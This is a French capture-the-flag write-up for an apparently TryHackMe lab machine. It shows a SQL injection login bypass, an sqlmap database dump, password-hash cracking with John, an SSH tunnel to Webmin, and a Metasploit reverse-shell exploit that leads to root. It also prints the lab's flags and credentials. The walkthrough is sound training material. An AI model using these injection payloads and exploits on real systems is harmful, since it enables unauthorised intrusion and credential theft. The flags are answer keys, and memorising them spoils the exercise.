*Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!*

[IP_VPN] : 10.18.94.166
[IP_Machine] : 10.10.69.255


# Task 1 : Deploy the vulnerable machine 

## What is the name of the large cartoon avatar holding a sniper on the forum?
Télécharger l'image principale. 

la charger sur google et la réponse s'affiche 

** Agent 47 ** 

# Task 2 : Obtain access via SQLI

## When you've logged in, what page do you get redirected to?

Login : ' or 1=1 # 
redirection : http://10.10.69.255/portal.php

** portal.php **

# Task 3 : Using SQLMap

## In the users table, what is the hashed password?
Lancer burp, faire une recherche simple 

Enregistrer la requête dans un fichier 

lancer sqlmap avec la commande suivante : 
``` sqlmap -r request.txt --dbms=mysql --dump ```

-r Permet de récupérer la requête sauvegardée en amont
--dbms Permet de décrire le type de BDD utilisée 
--dump permet de dumper entièrement les données de la BDD

``` Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

```

** ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 **

## What was the username associated with the hashed password?

** agent47 **

## What was the other table name?

```
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

** post ** 

# Task 4 : Cracking a password with JohnTheRipper

## What is the de-hashed password?

Enregistrer le mot de passe dans un fichier 
``` echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > agent47.txt ```

Trouver le format du hach pour john | pour hashcat 
``` hashid -j agent47.txt ```
ou 
``` hashid -m agent47.txt ```

Utiliser JohnTheRipper pour trouver le mot de passe :
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 agent47.txt 

videogamer124    (?)
```
** videogamer124 ** 

## What is the user flag?

Maintenant qu'on a l'username et le mot de passe, se connecter en SSH 
``` 
ssh agent47@10.10.69.255

password : 

 ```
Afficher l'interrieur du dossier 
``` 
ls

user.txt
```
Afficher le fichier user.txt
``` 
cat user.txt

649ac17b1480ac13ef1e4fa579dac95c 
```
   
** 649ac17b1480ac13ef1e4fa579dac95c ** 

# Task 5 : Exposing services with reserse SSH tunnels

## How many TCP sockets are running?

Exécuter la commande "ss -tulpn", pour savoir quelles socket connexions sont en cours d'exécution.

-t 	Afficher TCP les sockets
-u 	Afficher UDP les sockets
-l 	Affiche uniquement les prises d'écoute
-p 	Montre le processus utilisant le socket
-n 	Ne résout pas les noms de services 

```
ss -tulpn

Netid  State      Recv-Q Send-Q          Local Address:Port                         Peer Address:Port              
udp    UNCONN     0      0                           *:10000                                   *:*                  
udp    UNCONN     0      0                           *:68                                      *:*                  
tcp    LISTEN     0      128                         *:22                                      *:*                  
tcp    LISTEN     0      80                  127.0.0.1:3306                                    *:*                  
tcp    LISTEN     0      128                         *:10000                                   *:*                  
tcp    LISTEN     0      128                        :::22                                     :::*                  
tcp    LISTEN     0      128                        :::80                                     :::*   
```
Il y a donc ** 5 ** socket TCP en cours d'éxecution

## What is the name of the exposed CMS?

Le service qui tourne sur le port 10000 est bloqué par une règle de firewall depuis l'extérieur. On va donc utilsier un tunnel ssh pour accéder à ce service 

Ouvrir un nouveau terminal et se connecter en ssh sur le compte agent47 avec avec un tunnel d'accès sur le port 10000 : 

``` ssh -L 10000:localhost:10000 agent47@10.10.69.255 ```

Ouvrir un navigateur pour ensuite se connecter sur le service :

``` localhost:10000 ```

Le nom du CMS est affiché :
** webmin ** 

## What is the CMS version?

Se connecter avec les creds trouvés 
Username : agent47
Password : videogamer124

La version est affiché parmis les informations : 

** Webmin version 	1.580 ** 

# Task 6 : Privilage Escalation with Metasploit

## What is the root flag?

Ouvrir metasploit 
``` 
msfconsole 

search Webmin 1.580 
```

Comme il n'y a que 2 exploits dont 1 vérifié, on va prendre celui la : 

``` use 0 ```

On va modifier les options : 

``` 
set password videogamer124 
set username agent47
set LHOST localhost
set ssl false 
show payloads 
set payload 5 
set lhost tun0

```
Lancer la commande, et une session sera ouverte (Attention, le shell est pourri donc on ne voit pas qu'il est lancé) 

Se rendre sur le dossier /root et ouvrir le fichier root.txt

``` 
cat /root/root.txt

a4b945830144bdd71908d12d902adeee
```
** a4b945830144bdd71908d12d902adeee ** 
  










